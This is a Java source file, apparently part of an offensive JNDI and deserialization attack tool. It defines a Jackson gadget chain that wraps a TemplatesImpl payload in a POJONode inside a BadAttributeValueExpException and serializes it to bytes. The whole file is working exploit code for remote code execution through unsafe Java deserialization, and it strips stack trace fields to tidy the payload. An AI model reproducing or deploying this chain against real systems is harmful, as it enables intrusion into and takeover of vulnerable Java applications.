package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.management.BadAttributeValueExpException;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Jackson_BadAttribute_Templates implements SerializeObject{
	//jackson1
	
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        POJONode node = new POJONode(tempImpl);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Deserialize.setFieldValue(val,"val",node);
        // 删除堆栈信息
        Deserialize.setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        Deserialize.setFieldValue(val, "cause", null);
        Deserialize.setFieldValue(val, "suppressedExceptions", null);
        
        return val;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}